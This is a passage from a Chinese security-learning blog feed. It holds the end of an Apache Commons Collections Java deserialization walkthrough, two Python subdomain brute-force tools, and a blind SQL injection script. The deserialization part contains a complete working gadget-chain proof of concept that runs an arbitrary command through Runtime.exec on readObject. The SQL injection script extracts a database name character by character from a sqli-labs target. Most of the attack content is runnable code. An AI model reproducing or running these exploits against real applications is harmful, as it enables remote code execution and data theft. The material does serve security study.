class="keyword">Class</span> cl = <span class="keyword">Class</span>.forName("sun.reflect.annotation.AnnotationInvocationHandler");</span><br><span class="line">         Constructor ctor = cl.getDeclaredConstructor(<span class="keyword">Class</span>.<span class="keyword">class</span>, Map.<span class="keyword">class</span>);</span><br><span class="line">         ctor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">         <span class="keyword">Object</span> instance = ctor.newInstance(Target.<span class="keyword">class</span>, transformedMap);</span><br><span class="line"></span><br><span class="line">         //序列化</span><br><span class="line">         FileOutputStream fileOutputStream = <span class="built_in">new</span> FileOutputStream("serialize3.txt");</span><br><span class="line">         ObjectOutputStream objectOutputStream = <span class="built_in">new</span> ObjectOutputStream(fileOutputStream);</span><br><span class="line">         objectOutputStream.writeObject(instance);</span><br><span class="line">         objectOutputStream.<span class="keyword">close</span>();</span><br><span class="line"></span><br><span class="line">         //反序列化</span><br><span class="line">         FileInputStream fileInputStream = <span class="built_in">new</span> FileInputStream("serialize3.txt");</span><br><span class="line">         ObjectInputStream objectInputStream = <span class="built_in">new</span> ObjectInputStream(fileInputStream);</span><br><span class="line">         <span class="keyword">Object</span> result = objectInputStream.readObject();</span><br><span class="line">         objectInputStream.<span class="keyword">close</span>();</span><br><span class="line">         <span class="keyword">System</span>.<span class="keyword">out</span>.println(result);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/11/25/cong-apache-commons-collections-zhong-xue-xi-java-fan-xu-lie-hua/QQ%E6%88%AA%E5%9B%BE20201108122458.png" alt></p>
<h4 id="JDK1-8–LazyMap利用链"><a href="#JDK1-8–LazyMap利用链" class="headerlink" title="JDK1.8–LazyMap利用链"></a>JDK1.8–LazyMap利用链</h4><p>​    对于JDK 1.8来说，<code>AnnotationInvocationHandler</code>类中关键的触发点，setvalue发生了改变。所以我们需要寻找新的类重写readObject来实现调用，</p>
<h5 id="调用链-1"><a href="#调用链-1" class="headerlink" title="调用链"></a>调用链</h5><figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">反序列化BadAttributeValueExpException</span><br><span class="line">-&gt;<span class="module-access"><span class="module"><span class="identifier">BadAttributeValueExpException</span>.</span></span>read<span class="constructor">Object()</span></span><br><span class="line">-&gt;<span class="module-access"><span class="module"><span class="identifier">TideMapEntry</span>.</span></span><span class="keyword">to</span><span class="constructor">String()</span></span><br><span class="line">-&gt;<span class="module-access"><span class="module"><span class="identifier">TideMapEntry</span>.</span></span>get<span class="constructor">Value()</span></span><br><span class="line">-&gt;<span class="module-access"><span class="module"><span class="identifier">LazyMap</span>.</span></span>get<span class="literal">()</span></span><br><span class="line">-&gt;<span class="module-access"><span class="module"><span class="identifier">ChainedTransformer</span>.</span></span>transform<span class="literal">()</span></span><br></pre></td></tr></table></figure>

<h5 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h5><p>我们首先看一下LazyMap这个类,这个类也实现了一个map接口:</p>
<figure class="highlight processing"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> LazyMap(Map <span class="built_in">map</span>, Transformer factory)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">super</span>(<span class="built_in">map</span>);</span><br><span class="line">  <span class="keyword">if</span> (factory == <span class="keyword">null</span>) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Factory must not be null"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">this</span>.factory = factory;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//get方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">Object</span> <span class="built_in">get</span>(<span class="keyword">Object</span> <span class="built_in">key</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (!<span class="keyword">this</span>.<span class="built_in">map</span>.containsKey(<span class="built_in">key</span>))</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">Object</span> value = <span class="keyword">this</span>.factory.transform(<span class="built_in">key</span>); </span><br><span class="line">    <span class="keyword">this</span>.<span class="built_in">map</span>.put(<span class="built_in">key</span>, value);</span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">this</span>.<span class="built_in">map</span>.<span class="built_in">get</span>(<span class="built_in">key</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​        我们可以看到<strong>get方法</strong>中如果没有找到key的键值，就会调用<code>factory.transform(key);</code>,这里的factory变量属于Transformer接口类并且具体使用哪一个类来实例化对象是我们可控的。也就可以形成调用链。</p>
<p>那么如何去自动调用get()方法,跟进<code>TiedMapEntry</code>类</p>
<figure class="highlight processing"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> TiedMapEntry(Map <span class="built_in">map</span>, <span class="keyword">Object</span> <span class="built_in">key</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">this</span>.<span class="built_in">map</span> = <span class="built_in">map</span>;</span><br><span class="line">  <span class="keyword">this</span>.<span class="built_in">key</span> = <span class="built_in">key</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//toString方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">String</span> toString()</span><br><span class="line">&#123;</span><br><span class="line">   <span class="keyword">return</span> getKey() + <span class="string">"="</span> + getValue();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//getKey方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">Object</span> getValue()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">this</span>.<span class="built_in">map</span>.<span class="built_in">get</span>(<span class="keyword">this</span>.<span class="built_in">key</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在<code>TiedMapEntry</code>中，构造时传入使用<code>LazyMap</code>，调用<code>tostring()</code>方法，然后紧接着就会调用LazyMap类对象的get方法。</p>
<p>​    那么到目前为止，我们仍然需要一个类可以在反序列化重写readObject()时可以自动调用toString方法。完整的利用链就可以形成。</p>
<h5 id="BadAttributeValueExpException类"><a href="#BadAttributeValueExpException类" class="headerlink" title="BadAttributeValueExpException类"></a>BadAttributeValueExpException类</h5><p>看到<code>BadAttributeValueExpException</code>的<code>readObject</code>反序列化方法，调用了<code>toString</code>方法。</p>
<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> readObject(ObjectInputStream ois) <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    ObjectInputStream.GetField gf = ois.readFields();</span><br><span class="line">    Object valObj = gf.get(<span class="string">"val"</span>, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (valObj == <span class="keyword">null</span>) &#123;</span><br><span class="line">        val = <span class="keyword">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (valObj <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">        val= valObj;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (System.getSecurityManager() == <span class="keyword">null</span></span><br><span class="line">            || valObj <span class="keyword">instanceof</span> <span class="keyword">Long</span></span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Integer</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> <span class="keyword">Float</span></span><br><span class="line">            || valObj <span class="keyword">instanceof</span> <span class="keyword">Double</span></span><br><span class="line">            || valObj <span class="keyword">instanceof</span> <span class="keyword">Byte</span></span><br><span class="line">            || valObj <span class="keyword">instanceof</span> <span class="keyword">Short</span></span><br><span class="line">            || valObj <span class="keyword">instanceof</span> <span class="keyword">Boolean</span>) &#123;</span><br><span class="line">        val = valObj.toString();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; <span class="comment">// the serialized object is from a version without JDK-8019292 fix</span></span><br><span class="line">        val = System.identityHashCode(valObj) + <span class="string">"@"</span> + valObj.getClass().getName();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    其中 <code>valObj</code> 为构造的 <code>TiedMapEntry</code> 类的对象，可以看到其中调用了该类的 <code>toString</code> 函数。</p>
<p>​    所以，我们只要构造一个<code>BadAttributeValueExpException</code>对象，并注入我们精心制造的<code>TiedMapEntry</code>对象。就可在以在反序列时，执行任意命令。</p>
<h5 id="最后的POC"><a href="#最后的POC" class="headerlink" title="最后的POC"></a>最后的POC</h5><figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> Exec  &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> BadAttributeValueExpException getObject(<span class="keyword">final</span> String command) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> String[] execArgs = <span class="keyword">new</span> String[] &#123; command &#125;;</span><br><span class="line">        <span class="comment">// inert chain for setup</span></span><br><span class="line">        <span class="keyword">final</span> Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(</span><br><span class="line">                <span class="keyword">new</span> Transformer[]&#123; <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>) &#125;);</span><br><span class="line">        <span class="comment">// real chain for after setup</span></span><br><span class="line">        <span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(<span class="keyword">Runtime</span>.<span class="keyword">class</span>),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"getMethod"</span>, <span class="keyword">new</span> <span class="keyword">Class</span>[] &#123;</span><br><span class="line">                        String.<span class="keyword">class</span>, <span class="keyword">Class</span>[].<span class="keyword">class</span> &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line">                        <span class="string">"getRuntime"</span>, <span class="keyword">new</span> <span class="keyword">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>, <span class="keyword">new</span> <span class="keyword">Class</span>[] &#123;</span><br><span class="line">                        Object.<span class="keyword">class</span>, Object[].<span class="keyword">class</span> &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line">                        <span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="keyword">Class</span>[] &#123; String.<span class="keyword">class</span> &#125;, execArgs),</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>) &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> Map lazyMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line">        TiedMapEntry entry = <span class="keyword">new</span> TiedMapEntry(lazyMap, <span class="string">"foo"</span>);</span><br><span class="line"></span><br><span class="line">        BadAttributeValueExpException val = <span class="keyword">new</span> BadAttributeValueExpException(<span class="keyword">null</span>);</span><br><span class="line">        Field valfield = val.getClass().getDeclaredField(<span class="string">"val"</span>);</span><br><span class="line">        valfield.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        valfield.set(val, entry);</span><br><span class="line">        <span class="keyword">Class</span>&lt;? <span class="keyword">extends</span> Transformer&gt; aClass = transformerChain.getClass();</span><br><span class="line"></span><br><span class="line">        Field iTransformers = aClass.getDeclaredField(<span class="string">"iTransformers"</span>);</span><br><span class="line">        iTransformers.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        iTransformers.set(transformerChain,transformers);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> val;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> main(String[] args) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        BadAttributeValueExpException calc = getObject(<span class="string">"calc"</span>);</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream byteArrayOutputStream = <span class="keyword">new</span> ByteArrayOutputStream();<span class="comment">//用于存放person对象序列化byte数组的输出流</span></span><br><span class="line"></span><br><span class="line">        ObjectOutputStream objectOutputStream = <span class="keyword">new</span> ObjectOutputStream(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(calc);<span class="comment">//序列化对象</span></span><br><span class="line">        objectOutputStream.flush();</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] bytes = byteArrayOutputStream.toByteArray(); <span class="comment">//读取序列化后的对象byte数组</span></span><br><span class="line"></span><br><span class="line">        ByteArrayInputStream byteArrayInputStream = <span class="keyword">new</span> ByteArrayInputStream(bytes);<span class="comment">//存放byte数组的输入流</span></span><br><span class="line"></span><br><span class="line">        ObjectInputStream objectInputStream = <span class="keyword">new</span> ObjectInputStream(byteArrayInputStream);</span><br><span class="line">        Object o = objectInputStream.readObject(); <span class="comment">//将byte数组输入流反序列化</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/11/25/cong-apache-commons-collections-zhong-xue-xi-java-fan-xu-lie-hua/QQ%E6%88%AA%E5%9B%BE20201108124637.png" alt></p>
<h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h4><p><a href="https://b1ue.cn/archives/166.html" target="_blank" rel="noopener">https://b1ue.cn/archives/166.html</a></p>
<p><a href="https://www.mi1k7ea.com/2019/02/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">https://www.mi1k7ea.com/2019/02/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</a></p>
<p><a href="https://www.secpulse.com/archives/137940.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/137940.html</a></p>
<p><a href="https://shaobaobaoer.cn/java-an-quan-xue-xi-bi-ji-si-apache-commons-collectionsfan-xu-lie-hua-lou-dong/" target="_blank" rel="noopener">https://shaobaobaoer.cn/java-an-quan-xue-xi-bi-ji-si-apache-commons-collectionsfan-xu-lie-hua-lou-dong/</a></p>
<p><a href="https://security.tencent.com/index.php/blog/msg/97" target="_blank" rel="noopener">https://security.tencent.com/index.php/blog/msg/97</a></p>
<p><a href="https://www.xmanblog.net/java-deserialize-apache-commons-collections/" target="_blank" rel="noopener">https://www.xmanblog.net/java-deserialize-apache-commons-collections/</a></p>
<p><a href="https://lzwgiter.github.io/Apache-Commons-Collections%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">https://lzwgiter.github.io/Apache-Commons-Collections%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</a></p>
<p><a href="https://xz.aliyun.com/t/4558#toc-0" target="_blank" rel="noopener">https://xz.aliyun.com/t/4558#toc-0</a></p>
]]></content>
      <categories>
        <category>java代码审计学习</category>
      </categories>
      <tags>
        <tag>cc链</tag>
      </tags>
  </entry>
  <entry>
    <title>python编写子域名爆破小工具</title>
    <url>/2020/04/20/python-bian-xie-zi-yu-ming-bao-po-xiao-gong-ju/</url>
    <content><![CDATA[<h2 id="python编写子域名爆破小工具"><a href="#python编写子域名爆破小工具" class="headerlink" title="python编写子域名爆破小工具"></a>python编写子域名爆破小工具</h2><h4 id="字典生成工具编写"><a href="#字典生成工具编写" class="headerlink" title="字典生成工具编写"></a>字典生成工具编写</h4><p>这里主要使用的python的exrex模块：</p>
<p>此处有详细介绍，</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/asciimoo/</span>exrex</span><br></pre></td></tr></table></figure>

<p>这个模块的主要功能：</p>
<ul>
<li>生成所有匹配的字符串</li>
<li>生成随机匹配的字符串</li>
<li>计算匹配字符串的数量</li>
<li>简化正则表达式</li>
</ul>
<p>安装方法：</p>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line">pip <span class="keyword">install</span> exrex</span><br></pre></td></tr></table></figure>

<p>我们主要使用该模块的generate()方法。</p>
<ul>
<li>generate(s,limit=20)</li>
<li>函数的作用：创建一个生成器，生成给定正则表达式的所有匹配字符串</li>
<li>参数s:正则表达式</li>
<li>limit：范围限制，要求limit的类型为整型数</li>
</ul>
<h5 id="简单的例子："><a href="#简单的例子：" class="headerlink" title="简单的例子："></a>简单的例子：</h5><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">import exrex</span><br><span class="line"></span><br><span class="line"><span class="attribute">web_dic</span>=<span class="string">'demo'</span></span><br><span class="line"><span class="attribute">dic_pass</span>=<span class="string">'admin'</span></span><br><span class="line">rule = <span class="string">'&#123;web_dic&#125;[!@#]&#123;dic_pass&#125;'</span></span><br><span class="line">s = rule.format(<span class="attribute">web_dic</span>=web_dic,dic_pass=dic_pass)</span><br><span class="line">dics = list(exrex.generate(s))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> dics:</span><br><span class="line">    <span class="builtin-name">print</span> i</span><br></pre></td></tr></table></figure>

<h4 id="编写子域名爆破脚本"><a href="#编写子域名爆破脚本" class="headerlink" title="编写子域名爆破脚本"></a>编写子域名爆破脚本</h4><p>自己编写的理解脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> exrex  <span class="comment">#导入生成字典模块</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">host_replace</span><span class="params">(hosts)</span>:</span>         <span class="comment">#域名处理方法</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'://'</span> <span class="keyword">in</span> hosts:</span><br><span class="line">        hosts = hosts.split(<span class="string">'://'</span>)[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'/'</span> <span class="keyword">in</span> hosts: </span><br><span class="line">        hosts = hosts.replace(<span class="string">'/'</span>,<span class="string">''</span>)              </span><br><span class="line">    hosts = <span class="string">""</span>.join(hosts)</span><br><span class="line">    <span class="keyword">return</span> hosts</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dic_create</span><span class="params">(hosts)</span>:</span>        <span class="comment">#子域名字典生成方法</span></span><br><span class="line">    web_white = [<span class="string">'com'</span>, <span class="string">'cn'</span>, <span class="string">'gov'</span>, <span class="string">'edu'</span>, <span class="string">'org'</span>]</span><br><span class="line">    web_dics = hosts.split(<span class="string">'.'</span>)</span><br><span class="line">    <span class="keyword">for</span> web_dic <span class="keyword">in</span> web_dics:</span><br><span class="line">        <span class="keyword">if</span> web_dic <span class="keyword">not</span> <span class="keyword">in</span> web_white:</span><br><span class="line">            f_rule = open(<span class="string">'rule.ini'</span>, <span class="string">'r'</span>)</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> f_rule:</span><br><span class="line">                dics = list(exrex.generate(web_dic+i.strip(<span class="string">'\r\n'</span>)))</span><br><span class="line">                <span class="keyword">for</span> dic <span class="keyword">in</span> dics:</span><br><span class="line">                    <span class="keyword">if</span> len(dic)&gt;<span class="number">3</span>:</span><br><span class="line">                        dic_out = open(<span class="string">'mypass.txt'</span>,<span class="string">'a+'</span>)</span><br><span class="line">                        dic_out.write(dic+<span class="string">'\r\n'</span>)</span><br><span class="line">                        dic_out.close()</span><br><span class="line">                        <span class="keyword">print</span> dic</span><br><span class="line">    f_rule.close()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span>       <span class="comment">#主函数</span></span><br><span class="line">    hosts = raw_input(<span class="string">"Write Your Hosts :"</span>)</span><br><span class="line">    host =host_replace(hosts)</span><br><span class="line">    dic_create(host)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>参考：<a href="https://www.jianshu.com/p/a481a341eaa4" target="_blank" rel="noopener">https://www.jianshu.com/p/a481a341eaa4</a></p>
<p>子域名爆破脚本进阶版：</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line">import dns.resolver</span><br><span class="line">import threading</span><br><span class="line">import<span class="built_in"> Queue </span></span><br><span class="line">import optparse</span><br><span class="line">import sys                    </span><br><span class="line"></span><br><span class="line">queue = Queue.Queue()</span><br><span class="line">lock = threading.Lock()</span><br><span class="line"></span><br><span class="line">class GetSubDomain(threading.Thread):</span><br><span class="line">    <span class="string">""</span><span class="string">"docstring for SubDomain"</span><span class="string">""</span></span><br><span class="line">    def __init__(self, target,queue,outfile):</span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line">        self.target = target</span><br><span class="line">        self.queue = queue</span><br><span class="line">        self.rsv = dns.resolver.Resolver()</span><br><span class="line">        outfile = target + <span class="string">'.txt'</span> <span class="keyword">if</span> <span class="keyword">not</span> outfile <span class="keyword">else</span> outfile</span><br><span class="line">        self.f = open(<span class="string">'./output/'</span>+outfile,<span class="string">'a+'</span>)</span><br><span class="line">        self.ip_list = []</span><br><span class="line"></span><br><span class="line">    def _scan(self):</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> self.queue.empty():</span><br><span class="line">            self.ip_list = []</span><br><span class="line">            ips = None</span><br><span class="line">            sub_domain = self.queue.<span class="builtin-name">get</span>() + <span class="string">'.'</span> + self.target</span><br><span class="line">            <span class="keyword">for</span> _ <span class="keyword">in</span> range(3):</span><br><span class="line">                try:</span><br><span class="line">                    answers = self.rsv.query(sub_domain)</span><br><span class="line">                    <span class="keyword">if</span> answers:</span><br><span class="line">                        <span class="keyword">for</span> answer <span class="keyword">in</span> answers:</span><br><span class="line">                            <span class="keyword">if</span> answer.address <span class="keyword">not</span> <span class="keyword">in</span> self.ip_list:</span><br><span class="line">                                self.ip_list.append(answer.address)</span><br><span class="line">                except dns.resolver.NoNameservers, e:</span><br><span class="line">                    break</span><br><span class="line">                except Exception, e:</span><br><span class="line">                    pass</span><br><span class="line">            <span class="keyword">if</span> len(self.ip_list)&gt;0:</span><br><span class="line">                ips = <span class="string">','</span>.join(self.ip_list)</span><br><span class="line">                msg = sub_domain.ljust(30) + ips + <span class="string">'\n'</span></span><br><span class="line">                lock.acquire()</span><br><span class="line">                <span class="builtin-name">print</span> msg</span><br><span class="line">                self.f.write(msg)</span><br><span class="line">                lock.release()</span><br><span class="line">            self.queue.task_done()</span><br><span class="line"></span><br><span class="line">    def <span class="builtin-name">run</span>(self):</span><br><span class="line">        self._scan()</span><br><span class="line"></span><br><span class="line">def get_target(domain_list):</span><br><span class="line">    targets = []</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> open(domain_list,<span class="string">'r'</span>):</span><br><span class="line">        <span class="keyword">if</span> line:</span><br><span class="line">            targets.append(line.strip())</span><br><span class="line">    return targets</span><br><span class="line"></span><br><span class="line">def get_sub_queue(sub_file): #得到所有子域名的queue</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> open(sub_file,<span class="string">'r'</span>):</span><br><span class="line">        <span class="keyword">if</span> line:</span><br><span class="line">            queue.put(line.strip())</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    parser = optparse.OptionParser()</span><br><span class="line">    parser.add_option(<span class="string">'-u'</span>, <span class="string">'--url'</span>, <span class="attribute">dest</span>=<span class="string">'url'</span>,</span><br><span class="line">        <span class="attribute">type</span>=<span class="string">'string'</span>, <span class="attribute">help</span>=<span class="string">'Get a single top-level domain names.'</span>)</span><br><span class="line">    parser.add_option(<span class="string">'-l'</span>, <span class="string">'--list'</span>, <span class="attribute">dest</span>=<span class="string">'domain_list'</span>,</span><br><span class="line">        <span class="attribute">type</span>=<span class="string">'string'</span>, <span class="attribute">help</span>=<span class="string">'Top-level domain name list.'</span>)</span><br><span class="line">    parser.add_option(<span class="string">'-f'</span>, <span class="string">'--file'</span>, <span class="attribute">dest</span>=<span class="string">'sub_file'</span>, <span class="attribute">default</span>=<span class="string">'sub.txt'</span>,</span><br><span class="line">        <span class="attribute">type</span>=<span class="string">'string'</span>, <span class="attribute">help</span>=<span class="string">'Dict file used to brute sub names'</span>)</span><br><span class="line">    parser.add_option(<span class="string">'-t'</span>, <span class="string">'--threads'</span>, <span class="attribute">dest</span>=<span class="string">'threads_num'</span>, <span class="attribute">default</span>=60, </span><br><span class="line">        <span class="attribute">type</span>=<span class="string">'int'</span>, <span class="attribute">help</span>=<span class="string">'Number of threads. default = 60'</span>)</span><br><span class="line">    parser.add_option(<span class="string">'-o'</span>, <span class="string">'--outfile'</span>, <span class="attribute">dest</span>=<span class="string">'outfile'</span>, <span class="attribute">default</span>=None,</span><br><span class="line">        <span class="attribute">type</span>=<span class="string">'string'</span>, <span class="attribute">help</span>=<span class="string">'Output file name. default is &#123;target&#125;.txt'</span>)</span><br><span class="line"></span><br><span class="line">    (options, args) = parser.parse_args()</span><br><span class="line">    <span class="keyword">if</span> options.url:</span><br><span class="line">        urls = [options.url]</span><br><span class="line">    elif options.domain_list:</span><br><span class="line">        urls = get_target(options.domain_list)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        parser.print_help()</span><br><span class="line">        <span class="builtin-name">print</span> <span class="string">"Example: "</span></span><br><span class="line">        <span class="builtin-name">print</span> <span class="string">"\tpython getsub.py -u baidu.com"</span></span><br><span class="line">        <span class="builtin-name">print</span> <span class="string">"\tpython getsub.py -l domain.txt -f sub.txt -t 50"</span></span><br><span class="line">        sys.exit(0)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> url <span class="keyword">in</span> urls:</span><br><span class="line">        get_sub_queue(options.sub_file)</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> xrange(1,options.threads_num+1):</span><br><span class="line">            t = GetSubDomain(url,queue,options.outfile)</span><br><span class="line">            t.setDaemon(<span class="literal">True</span>)</span><br><span class="line">            t.start()</span><br><span class="line">        queue.join()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>python编程学习</category>
      </categories>
  </entry>
  <entry>
    <title>python编写sql注入&amp;xml注入工具</title>
    <url>/2020/04/20/python-bian-xie-sql-zhu-ru-xml-zhu-ru-gong-ju/</url>
    <content><![CDATA[<h2 id="python编写sql注入-amp-xml注入工具"><a href="#python编写sql注入-amp-xml注入工具" class="headerlink" title="python编写sql注入&amp;xml注入工具"></a>python编写sql注入&amp;xml注入工具</h2><h4 id="python编写sql盲注注入脚本"><a href="#python编写sql盲注注入脚本" class="headerlink" title="python编写sql盲注注入脚本"></a>python编写sql盲注注入脚本</h4><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">import requests  #导入request模块</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://192.168.181.138/sqli-labs-master/Less-8/?id=1%s'</span></span><br><span class="line">headers = &#123;<span class="string">'User-Agent'</span>:<span class="string">'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0'</span>&#125;  #定义请求header头</span><br><span class="line"><span class="attribute">check_data</span>=list('1234567890abcdefghijklmnopqrstuzwxyz@')  </span><br><span class="line"><span class="builtin-name">print</span>(<span class="string">"SQL Injection for MySQL!"</span>)</span><br><span class="line">l = <span class="string">"' and length(database())=%s and '1'='1"</span>            #定义注入语句</span><br><span class="line">st = <span class="string">"' and substr(database(),%s,1)='%s'and '1'='1"</span>     #定义注入语句</span><br><span class="line">user = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(0,20):</span><br><span class="line">    sql = l % str(i)        #payload拼接</span><br><span class="line">    judge1 = requests.<span class="builtin-name">get</span>(url % sql,<span class="attribute">headers</span>=headers,timeout=30)</span><br><span class="line">    <span class="keyword">if</span> judge1.content.<span class="builtin-name">find</span>(b<span class="string">"You are in..........."</span>) != -1:   #判断页面回显</span><br><span class="line">        length = i</span><br><span class="line">        <span class="builtin-name">print</span>(i)</span><br><span class="line">        break</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> range(1,i+1):</span><br><span class="line">    <span class="keyword">for</span> ss <span class="keyword">in</span> check_data:</span><br><span class="line">        str_user = st % (str(k),str(ss))</span><br><span class="line">        judge2 = requests.<span class="builtin-name">get</span>(url % str_user,<span class="attribute">headers</span>=headers,timeout = 30)</span><br><span class="line">        <span class="keyword">if</span> judge2.content.<span class="builtin-name">find</span>(b<span class="string">"You are in..........."</span>) != -1:</span><br><span class="line">           <span class="built_in"> user </span>=<span class="built_in"> user </span>+ ss</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="builtin-name">print</span>(user)</span><br></pre></td></tr></table></figure>

